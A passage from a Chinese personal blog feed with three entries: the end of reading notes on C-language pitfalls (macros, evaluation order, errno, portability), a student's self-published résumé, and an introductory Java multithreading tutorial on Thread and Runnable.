<h3 id="避免“举偶法”"><a href="#避免“举偶法”" class="headerlink" title="避免“举偶法”"></a>避免“举偶法”</h3><p>这一节中，主要思想就是：改变指针的值，不会改变指针所指向的内容。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">char *p = &quot;hello&apos;;</div><div class="line">char *q = &quot;Hello world&quot;;</div></pre></td></tr></table></figure>
<p>如果此时执行 <code>p = q</code>,这个语句并没有同时复制内存中的字符，也就是说原来的 p 指向的内存单元中存储的还是”hello”这个字符串。</p>
<h3 id="边界计算与不对称边界"><a href="#边界计算与不对称边界" class="headerlink" title="边界计算与不对称边界"></a>边界计算与不对称边界</h3><p>看一段代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int i,a[10];</div><div class="line"></div><div class="line">for(i=0;i&lt;=9;i++)</div><div class="line">	a[i] = 0;</div><div class="line">    </div><div class="line">for(i=0;i&lt;10;i++)</div><div class="line">	a[i] = 0;</div></pre></td></tr></table></figure>
<p>上面的两个循环都是初始化数组为0，但是那种写法好呢？</p>
<p>先不着急回答上面的问题。如果我们想要求数组 a 中的元素个数，第一种写法我们的求法是 <code>9-0+1</code>，第二种写法的求法是 <code>10-0</code>。请问下，那种解法更容易出错呢？个人认为是第一种，因为加 1 的操作可能会被我们忘记。</p>
<p>所以我们更加推荐第二种不对称的写法。<strong>用第一个入界点和第一个出界点来表示一个数值范围。注意，入界点是在范围内的，但出界点是不在范围内的。</strong>拿队列来说吧，队列的头所在的位置是空的，是出界点，队列的尾的位置是有元素的，是入界点，所以计算队列中的元素个数，就用 end-start，就不用+1的操作了。</p>
<p>这种思想在程序设计中有诸多优点：</p>
<ul>
<li>取值范围的大小就是上界下界之差。</li>
<li>如果取值范围为空，那么上界等于下界。</li>
<li>即使取值范围为空，上界也不可能小于下界。</li>
</ul>
<h3 id="求值顺序"><a href="#求值顺序" class="headerlink" title="求值顺序"></a>求值顺序</h3><p>求值顺序和运算符优先级是两个不同的东西。运算符优先级是保证 <code>a+b*c</code>被解释成 <code>a+(b*c)</code>的这样一类规则。求值规则是另一种规则，可以保证像下面的语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(count!=0 &amp;&amp; sum/count &lt; smallaverage)</div><div class="line">	printf(&quot;hello,world&quot;);</div></pre></td></tr></table></figure>
<p>即使当变量count为0时，也不会产生一个“用0做除数”的错误。也就是说，求值顺序保证先求 <code>count != 0</code>的值，且只用其值为1，才继续求值。</p>
<p>C语言中只用四个运算符（&amp;&amp;、||、?: 和 ，）存在规定的求值范围,其他所有的运算符对其操作数求值的顺序是未定义的，所以如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">i = 0;</div><div class="line">while(i&lt;n)</div><div class="line">	y[i] = x[i++];</div></pre></td></tr></table></figure>
<p>是存在风险的。因为上述代码如果要正确运行，需要保证 <code>i++</code> 在 <code>y[i] = x[i]</code>之后运行，但这是无法保证的。所以推荐写法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">i = 0;</div><div class="line">while(i&lt;n)&#123;</div><div class="line">	y[i] = x[i];</div><div class="line">    i++;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="为函数main提供返回值"><a href="#为函数main提供返回值" class="headerlink" title="为函数main提供返回值"></a>为函数main提供返回值</h3><p>如果不为main函数显示声明返回类型，那么就会默认为整型。虽然某些情况下函数main的返回值无关紧要，但是大多数C语言实现都通过这个返回值来告知系统该函数执行成功或者失败。</p>
<h2 id="5-库函数"><a href="#5-库函数" class="headerlink" title="5|库函数"></a>5|库函数</h2><p>这一章介绍一些使用过程中经常会犯错的库函数。</p>
<h3 id="返回整数的getchar函数"><a href="#返回整数的getchar函数" class="headerlink" title="返回整数的getchar函数"></a>返回整数的getchar函数</h3><p>先看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line"></div><div class="line">main()&#123;</div><div class="line">	char c;</div><div class="line">    while((c=getchar()) != EOF)</div><div class="line">    	putchar(c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个例子本意是把标准输入复制到标准输出，但是有潜在的bug。原因是变量 c 是 char 类型的，只占一个字节，但是getchar函数返回的是int 整数，也就是说c无法容下所有可能的字符，那么如果EOF不在c所能容下的字符之中，就陷入了死循环了。</p>
<h3 id="更新顺序文件"><a href="#更新顺序文件" class="headerlink" title="更新顺序文件"></a>更新顺序文件</h3><p>这一小节讲文件的操作。在C语言中，在对文件操作是，<strong>需要注意一个输入操作不能随后直接紧跟一个输出操作，反之亦然。</strong>如果要同时进行输入输出操作，必须在其中插入 fseek() 函数。</p>
<blockquote>
<p>int fseek(FILE <em>stream, long offset, int fromwhere);函数设置文件指针stream的位置。如果执行成功，stream将指向以fromwhere为基准，偏移offset（指针偏移量）个字节的位置，函数返回0。如果执行失败(比如offset取值大于等于2</em>1024<em>1024</em>1024，即long的正数范围2G)，则不改变stream指向的位置，函数返回一个非0值。</p>
</blockquote>
<h3 id="缓冲输出与内存分配"><a href="#缓冲输出与内存分配" class="headerlink" title="缓冲输出与内存分配"></a>缓冲输出与内存分配</h3><p>程序有两种输出方式：</p>
<ul>
<li>即时处理 [相应快，但系统负担较高]</li>
<li>先暂存起来，然后大块写入  [相应慢，但减少io交互]</li>
</ul>
<p>两种各有各的优缺点，需要根据实际情况进行选择。</p>
<p>缓存可以通过库函数 <code>setbuf</code>实现。如果buf是一个大小适合的字符数组，那么 <code>setbuf(stdout,buf)</code>语句将通知输入/输出库，所有写到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填满或者程序员直接调用 ·fflush`,buf缓冲区中的内容才实际写入到stdout中。<strong>那么问题来了，如果在程序退出时，缓冲区没满，我们又没有调用fflush，会出现什么问题呢？</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main()&#123;</div><div class="line">    int c;</div><div class="line">    char buf[BUFSIZ];   //BUFSIZE缓冲区的大小在stdio.h有定义</div><div class="line">    setbuf(stdout,buf); //所有写入到stdout的输出都应该使用buf作为输出缓冲区，直到buf缓冲区被填                                  //满或者程序员直接调用fflush</div><div class="line">    while((c=getchar())!=EOF)</div><div class="line">        putchar(c);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在这个例子中，有潜在的bug。如果在程序退出的时候，buf缓冲区没有被填满，buf缓冲中的数据将不会被写入stdout中。</p>
<p>要避免类似的错误，有两种方法：</p>
<ul>
<li>让缓冲数组成为静态数组</li>
<li>动态分配缓冲区</li>
</ul>
<h3 id="使用errno检测错误"><a href="#使用errno检测错误" class="headerlink" title="使用errno检测错误"></a>使用errno检测错误</h3><p>很多库函数在执行失败时会通过一个名称为errno的外部变量通知程序该函数调用失败。但是不能利用errno判断函数是否调用失败。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/*调用库函数*/</div><div class="line">if(errno)</div><div class="line">      /*处理错误*/</div></pre></td></tr></table></figure></p>
<p>但这样是错误的，因为在库函数调用没有失败的情况下，并没有强制要求库函数一定要设置errno为0，这样errno的值就可能是前一个执行失败的库函数设置的值。</p>
<p>所以有人可能会想下面的例子是对的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">errno  = 0</div><div class="line">/*调用库函数*/</div><div class="line">if(errno)</div><div class="line">      /*处理错误*/</div></pre></td></tr></table></figure>
<p>很遗憾，这也是错的，因为库函数调用成功是，既没有强制要求对errno清零，但同时也没有禁止 设置errno。<strong>哪为什么调用成功了还有设置errno呢？</strong>因为库函数可能会调用其他的库函数，在调用其他的库函数过程中可能会出错从而设置errno。比如fopen，fopen函数调用过程中可能需要调用其他的库函数，以检测同名文件是否存在。</p>
<p>所以，在调用库函数时，应首先检测作为错误指示的返回值，确定程序执行已经失败，然后再检查errno，来搞清楚出错原因：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/* 调用库函数 */</div><div class="line">if(返回的错误值)</div><div class="line">        检查errno</div></pre></td></tr></table></figure></p>
<h3 id="库函数signal"><a href="#库函数signal" class="headerlink" title="库函数signal"></a>库函数signal</h3><p>signal库函数可作为捕获异步事件的一种方式。源文件：#include<signal.h></signal.h></p>
<p>signal(signal type,handler funtion)signal type代表系统头文件signal.h中定义的某些常量，这些常量用来标识signal加密手机将要捕获的信号类型。handler funtion 是当指定的时间发生时，将要加以调用的事件处理函数。</p>
<p>一个信号可能在C程序执行期间的任何时刻上发生，信号甚至可能出现在某些负责库函数（如malloc）的过程中。因此，信号的处理函数不应该调用上述类型的库函数。</p>
<p>当一个算术运算错误（例如溢出或者零作除数）引发一个信号时，signal处理函数的唯一安全、可移植的操作是打印一条出错消息，然后使用longjmp或exit立即退出程序。</p>
<h2 id="6-预处理器"><a href="#6-预处理器" class="headerlink" title="6|预处理器"></a>6|预处理器</h2><p><strong>宏只是对程序的文本起作用</strong>。宏提供了一种对组成C语言程序的字符进行变换的方式，并没有作用于程序中的对象。宏是一把双刃剑。</p>
<h3 id="不能忽视宏定义中的空格"><a href="#不能忽视宏定义中的空格" class="headerlink" title="不能忽视宏定义中的空格"></a>不能忽视宏定义中的空格</h3><p>在定义宏的时候，要注意空格，比如：</p>
<p><code>#define f (x)  ((x)-1)</code></p>
<p>上面的宏定义有两种解释方法：</p>
<ul>
<li>f(x) 代表 ((x)-1)</li>
<li>f 代表 x ((x)-1)</li>
</ul>
<p>虽然我们的本意是第一种，但是很遗憾，实际上是第二种，因为我们在定义宏的时候，f与(x) 之间多了个空格!!所以正确写法 <code>#define f(x)  ((x)-1)</code></p>
<h3 id="宏不是函数"><a href="#宏不是函数" class="headerlink" title="宏不是函数"></a>宏不是函数</h3><p>虽然宏定义表面上与函数非常类似，但是宏定义不是函数，<strong>宏只是对程序的文本起作用</strong>。我们经常看到这样的写法:<code>#define abs(x) (((x)&gt;=0)?(x):-(x))</code>或者<code>#define max(a,b) ((a)&gt;(b)?(a):(b))</code>。很多人会不解为什么要用这么多括号，不要小看这些括号，它们额的作用是预防引起优先级有关的问题。</p>
<p>但是当遇到递增运算时，括号也不怎么管用了。因为如果一个操作数被两处用到，就会被求值两处。看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">biggest = x[0];</div><div class="line">i = 1;</div><div class="line">while(i &lt; n)&#123;</div><div class="line">	biggest = max(biggest,x[i++]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当代码中的max是我们刚定义的宏时，就出现了一些意想不到的事情。假设：</p>
<pre><code>x[0] = 2;
x[1] = 3;
x[2] = 1;
</code></pre><p>当我们把宏定义展开时，是这样的：<code>biggest = ((biggest)&gt;(x[i++])?(biggest):(x[i++]));</code>。在这个代码中，biggest将与x[i++] 比较，i此时为1，x[1]为3，biggest为2，比较结果为false。为i++,比较后 i = 2。比较结果为false,所以x[i++]的值讲被赋给biggest,但是在比较的时候，i已经变成了2，所以biggest的值为1。这时，又因为i++,i的值变为了3。不可思议吧。</p>
<p>但是，如果这里的max是个函数的话，是不会有什么问题的。</p>
<p>还应该注意，<strong>宏展开可能产生非常庞大的表达式，占用的空间远远超过了编程者所期望的空间</strong>。</p>
<h3 id="宏不是语句"><a href="#宏不是语句" class="headerlink" title="宏不是语句"></a>宏不是语句</h3><p>主要理解两点：</p>
<ul>
<li>夸张的说我们可以用宏把一门语言变成另外一门语言，但是问题会很多，比如说：导致替换后的分号有时候要加有时候不用加，大括号的匹配出现问题，else的匹配出现问题</li>
<li>一个小技巧能避免上述的问题：<code>#define deal(x) (表达式一||表达式二)</code>这样可以让if判断语句通过 || 或者 &amp;&amp; 来简化操作，并且不用但是大括号和else的匹配问题</li>
</ul>
<h3 id="宏并不是类型定义"><a href="#宏并不是类型定义" class="headerlink" title="宏并不是类型定义"></a>宏并不是类型定义</h3><p>看个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define T1 struct foo *</div><div class="line">typedef struct foo *T2</div></pre></td></tr></table></figure>
<p>可以看出T1，T2概念上完全相同，都是指向结构foo的指针，如果用它们来定义多个变量时，问题就来了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">T1 a,b;</div><div class="line">T2 a,b;</div></pre></td></tr></table></figure>
<p>对宏定义的T1来说，是这样的 <code>struct foo * a,b;</code>,a,b是不同类型的变量，对T2来说，a，b是一样的。所以还是要区分宏与类型定义的不同。</p>
<h2 id="7-可移植性缺陷"><a href="#7-可移植性缺陷" class="headerlink" title="7|可移植性缺陷"></a>7|可移植性缺陷</h2><p>不同同的C语言实现都会尽量适应ANSI C标准，但还是会有一些微小差别，如果希望一个c程序在另一个编译环境中也能运行，必须掌握很多细小的差别。</p>
<h3 id="应对C语言标准变更"><a href="#应对C语言标准变更" class="headerlink" title="应对C语言标准变更"></a>应对C语言标准变更</h3><p>语言标准的变更，如果使用它们，程序更容易编写且不易出错，但是代价也大，就是这些程序无法再较早的编译器上工作。需要在使用与不适用之间做出权衡。</p>
<h3 id="标识符名称的限制"><a href="#标识符名称的限制" class="headerlink" title="标识符名称的限制"></a>标识符名称的限制</h3><p>某些C语言实现会把标识符中出现的所有字符作为有效字符，而有些C实现则会自动截断长标识符名称的尾部。连接器也会对他们能够处理的名称强加限制，例如外部名称中只允许使用大写字母。</p>
<p>需要注意：</p>
<ul>
<li>区分大小写？</li>
<li>能区别的字符长度？</li>
</ul>
<h3 id="整数的大小"><a href="#整数的大小" class="headerlink" title="整数的大小"></a>整数的大小</h3><p>主要的要点：</p>
<ul>
<li>C语言对各种不同类型的整数（short，int，long）的相对长度做了一些规定：（1）三种类型整型长度非递减（2）一个普通的（int）足够大容纳任何数组下标（3）字符长度由硬件特性决定。</li>
<li>可移植性最好的是long。因为其能表示的范围是最大的，但是也会带来空间的消耗。</li>
</ul>
<h3 id="字符是有符号整数还是无符号整数"><a href="#字符是有符号整数还是无符号整数" class="headerlink" title="字符是有符号整数还是无符号整数"></a>字符是有符号整数还是无符号整数</h3><p>现代大多数计算机都支持8位字符，并非所有的编译器都按照同样的方式来解释这8位数，可能会将其识别为有符号数或无符号数。有符号范围为-128-127，无符号为0-255.可将这个字符声明为无符号字符（unsigned char）.另外，如果c是一个字符，使用（unsigned） c可能会失败，因为c将首先被转为int型整数。正确的方式是使用（unsigned char）c，这种方法不会转换为int整数。</p>
<h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><ul>
<li>右移要区分是算术右移还是逻辑右移</li>
<li>如果被移位对象是n位，那么移位计数&gt;=0,严格小于n</li>
<li>移位可以用来处理除数运算，且速度会比正常的除法操作快</li>
</ul>
<h3 id="内存位置0"><a href="#内存位置0" class="headerlink" title="内存位置0"></a>内存位置0</h3><ul>
<li>null指针不指向任何对象，因此，除非是赋值或者比较运算，其他任何目的使用null指针都是非法的。某些编译器对内存位置0强加了硬件级的读保护；其他只允许读，不允许写。在所有C程序中，勿用null指针的效果都是未定义的。</li>
<li>不同的编译器对null的规定也不同。可以通过把程序移到不允许读内存位置0的机器上运行来检查这个问题。</li>
</ul>
<h3 id="除法运算时发生的截断"><a href="#除法运算时发生的截断" class="headerlink" title="除法运算时发生的截断"></a>除法运算时发生的截断</h3><p>对于：<br><code>q= a/b</code>;<br><code>r= a%b</code>;<br>我们希望a、b、q、r之间维持怎样的关系呢？</p>
<ol>
<li>最重要的一点，我们希望q*b+r==a，因为这是定义余数的关系。</li>
<li>如果我们改变a的正负，我们希望这会改变q的符号，这不会改变q的绝对值。</li>
<li>当b&gt;0时，我们希望保证r&gt;=0且r&lt;b。例如，如果余数用于哈希表的索引，确保它是一个有效的索引值很重要。</li>
</ol>
<p>但是上述三条无法同时满足。<br>在取余的时候尽量避免被余数为负，并且声明为无符号数。</p>
<h3 id="首先释放，然后重新分配"><a href="#首先释放，然后重新分配" class="headerlink" title="首先释放，然后重新分配"></a>首先释放，然后重新分配</h3><p>大多数c语言实现都为使用者提供了3个内存分配函数：malloc，realloc和free。</p>
<ul>
<li>调用malloc(n)将返回一个指针，指向一块新分配的可容纳n个字符的内存，编程者可以使用这块内存。</li>
<li>把malloc(n)返回的指针作为参数传入给free函数，就释放了这块内存，这样就可以重新利用了。</li>
<li>调用realloc函数时，需要把指针向一块已分配内存的区域指针以及这块内存新的大小作为参数传入，就可以调整这块内存区域为新的大小，这个过程可能涉及到内存的拷贝。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-导读&quot;&gt;&lt;a href=&quot;#0-导读&quot; class=&quot;headerlink&quot; title=&quot;0|导读&quot;&gt;&lt;/a&gt;0|导读&lt;/h2&gt;&lt;p&gt;程序设计错误实际上反映的是程序与程序员对该程序的“心智模式”两者的相异之处。&lt;/p&gt;
&lt;h2 id=&quot;1-词法陷阱&quot;&gt;&lt;a 
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>吴多智|个人简历</title>
    <link href="http://yoursite.com/2018/04/23/%E5%90%B4%E5%A4%9A%E6%99%BA-%E4%B8%AA%E4%BA%BA%E7%AE%80%E5%8E%86/"/>
    <id>http://yoursite.com/2018/04/23/吴多智-个人简历/</id>
    <published>2018-04-23T11:02:22.000Z</published>
    <updated>2018-05-06T11:30:14.794Z</updated>
    
    <content type="html"><![CDATA[<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><ul>
<li>吴多智</li>
<li>Tel: 130-9892-1645</li>
<li>Email: wduozhi@gmail.com</li>
<li>Github: <a href="https://github.com/wuduozhi" target="_blank" rel="external">https://github.com/wuduozhi</a></li>
<li>Blog: wuduozhi.me</li>
</ul>
<hr>
<h3 id="自我评价"><a href="#自我评价" class="headerlink" title="自我评价"></a>自我评价</h3><ul>
<li>一年的线上项目开发维护经历，熟悉项目开发流程</li>
<li>对Linux有基本的了解，能搭建服务器环境，有搭建个人网站的经历</li>
<li>熟悉git版本控制工具</li>
<li>学习能力强，大一自学Web开发</li>
</ul>
<hr>
<h3 id="项目经历"><a href="#项目经历" class="headerlink" title="项目经历"></a>项目经历</h3><h4 id="内容分发平台-http-1000-hnu-edu-cn"><a href="#内容分发平台-http-1000-hnu-edu-cn" class="headerlink" title="内容分发平台  http://1000.hnu.edu.cn"></a>内容分发平台  <a href="http://1000.hnu.edu.cn" target="_blank" rel="external">http://1000.hnu.edu.cn</a></h4><ul>
<li>学校通知、活动等内容分发平台，类似学校的门户网站。项目采用mvc架构，前后端完全分离，后端使用PHP的CI框架，前端使用Vue，用RESTFul API接口进行数据交互</li>
<li>自己负责后台逻辑的开发，熟练掌握了CI框架的使用，掌握对Mysql数据库的使用，理解RESTFul API接口的设计规范，加深了对MVC架构的理解</li>
</ul>
<h4 id="微信公众号后台开发"><a href="#微信公众号后台开发" class="headerlink" title="微信公众号后台开发"></a>微信公众号后台开发</h4><ul>
<li>学校网络工作室的微信公众号，负责原创内容的分发和集成一些功能，如成绩查询、课表查询…后台使用PHP的微框架Slim+Medoo，Slim负责处理请求的相应，Medoo负责数据库的处理，前端使用jQuery，用RESTFul API接口进行数据交互</li>
<li>自己负责后台功能的业务逻辑的开发与接入微信的验证，过程中熟悉了微信公众号api。这一经历，自己懂得了怎么去学习与调用别人的api,比如百度、腾讯…的人工智能平台</li>
</ul>
<hr>
<h3 id="技能水平"><a href="#技能水平" class="headerlink" title="技能水平"></a>技能水平</h3><ul>
<li>后端技术<ul>
<li>掌握php后台开发，熟悉常见的MVC框架，CI、TP</li>
<li>熟悉Java后台开发，了解spring，Hibernate</li>
</ul>
</li>
<li>前端技术<ul>
<li>了解前端三剑客基本语法，能看懂前端代码，与前端沟通无障碍</li>
</ul>
</li>
<li>服务器<ul>
<li>了解Linux系统的基本使用，能搭建服务器环境</li>
</ul>
</li>
</ul>
<hr>
<h3 id="教育背景"><a href="#教育背景" class="headerlink" title="教育背景"></a>教育背景</h3><p>2016.9-至今 湖南大学 软件工程（本科）</p>
<p>主修课程：数据结构、操作系统、深入理解计算机系统</p>
<p>校内荣誉：2017单项奖学金</p>
<p>感谢您花时间阅读我的简历，期待能有机会和您共事。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;个人信息&quot;&gt;&lt;a href=&quot;#个人信息&quot; class=&quot;headerlink&quot; title=&quot;个人信息&quot;&gt;&lt;/a&gt;个人信息&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;吴多智&lt;/li&gt;
&lt;li&gt;Tel: 130-9892-1645&lt;/li&gt;
&lt;li&gt;Email: wduozhi@
    
    </summary>
    
      <category term="college" scheme="http://yoursite.com/categories/college/"/>
    
    
      <category term="college" scheme="http://yoursite.com/tags/college/"/>
    
  </entry>
  
  <entry>
    <title>Java|Java多线程干货系列-1</title>
    <link href="http://yoursite.com/2018/04/20/Java-Java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%B9%B2%E8%B4%A7%E7%B3%BB%E5%88%97-1/"/>
    <id>http://yoursite.com/2018/04/20/Java-Java多线程干货系列-1/</id>
    <published>2018-04-20T10:14:04.000Z</published>
    <updated>2018-04-20T07:38:15.641Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>多线程并发编程是Java编程中重要的一块内容，也是面试重点覆盖区域，所以学好多线程并发编程对我们来说极其重要，下面跟我一起开启本次的学习之旅吧。</p>
<h3 id="线程与进程"><a href="#线程与进程" class="headerlink" title="线程与进程"></a>线程与进程</h3><ol>
<li><p>线程：进程中负责程序执行的执行单元<br>线程本身依靠程序进行运行<br>线程是程序中的顺序控制流，只能使用分配给程序的资源和环境</p>
</li>
<li><p>进程：执行中的程序<br>一个进程至少包含一个线程</p>
</li>
<li><p>单线程：程序中只存在一个线程，实际上主方法就是一个主线程</p>
</li>
<li><p>多线程：在一个程序中运行多个任务<br>目的是更好地使用CPU资源</p>
</li>
</ol>
<h3 id="线程的实现"><a href="#线程的实现" class="headerlink" title="线程的实现"></a>线程的实现</h3><h4 id="继承Thread类"><a href="#继承Thread类" class="headerlink" title="继承Thread类"></a>继承Thread类</h4><p>在java.lang包中定义, 继承Thread类必须重写run()方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">class MyThread extends Thread&#123;</div><div class="line">    private static int num = 0;</div><div class="line"> </div><div class="line">    public MyThread()&#123;</div><div class="line">        num++;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        System.out.println(&quot;主动创建的第&quot;+num+&quot;个线程&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>创建好了自己的线程类之后，就可以创建线程对象了，然后通过start()方法去启动线程。注意，不是调用run()方法启动线程，run方法中只是定义需要执行的任务，如果调用run方法，即相当于在主线程中执行run方法，跟普通的方法调用没有任何区别，此时并不会创建一个新的线程来执行定义的任务。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">public class Test &#123;</div><div class="line">    public static void main(String[] args)  &#123;</div><div class="line">        MyThread thread = new MyThread();</div><div class="line">        thread.start();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">class MyThread extends Thread&#123;</div><div class="line">    private static int num = 0;</div><div class="line">    public MyThread()&#123;</div><div class="line">        num++;</div><div class="line">    &#125;</div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        System.out.println(&quot;主动创建的第&quot;+num+&quot;个线程&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面代码中，通过调用start()方法，就会创建一个新的线程了。为了分清start()方法调用和run()方法调用的区别，请看下面一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">public class Test &#123;</div><div class="line">    public static void main(String[] args)  &#123;</div><div class="line">        System.out.println(&quot;主线程ID:&quot;+Thread.currentThread().getId());</div><div class="line">        MyThread thread1 = new MyThread(&quot;thread1&quot;);</div><div class="line">        thread1.start();</div><div class="line">        MyThread thread2 = new MyThread(&quot;thread2&quot;);</div><div class="line">        thread2.run();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line">class MyThread extends Thread&#123;</div><div class="line">    private String name;</div><div class="line"> </div><div class="line">    public MyThread(String name)&#123;</div><div class="line">        this.name = name;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        System.out.println(&quot;name:&quot;+name+&quot; 子线程ID:&quot;+Thread.currentThread().getId());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="/images/java-多线程-01.png" alt="结果"></p>
<p>从输出结果可以得出以下结论：</p>
<p>1）thread1和thread2的线程ID不同，thread2和主线程ID相同，说明通过run方法调用并不会创建新的线程，而是在主线程中直接运行run方法，跟普通的方法调用没有任何区别；</p>
<p>2）虽然thread1的start方法调用在thread2的run方法前面调用，但是先输出的是thread2的run方法调用的相关信息，说明新线程创建的过程不会阻塞主线程的后续执行。</p>
<h4 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h4><p>在Java中创建线程除了继承Thread类之外，还可以通过实现Runnable接口来实现类似的功能。实现Runnable接口必须重写其run方法。<br>下面是一个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public class Test &#123;</div><div class="line">    public static void main(String[] args)  &#123;</div><div class="line">        System.out.println(&quot;主线程ID：&quot;+Thread.currentThread().getId());</div><div class="line">        MyRunnable runnable = new MyRunnable();</div><div class="line">        Thread thread = new Thread(runnable);</div><div class="line">        thread.start();</div><div class="line">    &#125;</div><div class="line">&#125; </div><div class="line">class MyRunnable implements Runnable&#123;</div><div class="line">    public MyRunnable() &#123;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    @Override</div><div class="line">    public void run() &#123;</div><div class="line">        System.out.println(&quot;子线程ID：&quot;+Thread.currentThread().getId());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Runnable的中文意思是“任务”，顾名思义，通过实现Runnable接口，我们定义了一个子任务，然后将子任务交由Thread去执行。注意，这种方式必须将Runnable作为Thread类的参数，然后通过Thread的start方法来创建一个新线程来执行该子任务。如果调用Runnable的run方法的话，是不会创建新线程的，这根普通的方法调用没有任何区别。</p>
<p>事实上，查看Thread类的实现源代码会发现Thread类是实现了Runnable接口的。</p>
<p>在Java中，这2种方式都可以用来创建线程去执行子任务，具体选择哪一种方式要看自己的需求。直接继承Thread类的话，可能比实现Runnable接口看起来更加简洁，但是由于Java只允许单继承，所以如果自定义类需要继承其他类，则只能选择实现Runnable接口。</p>
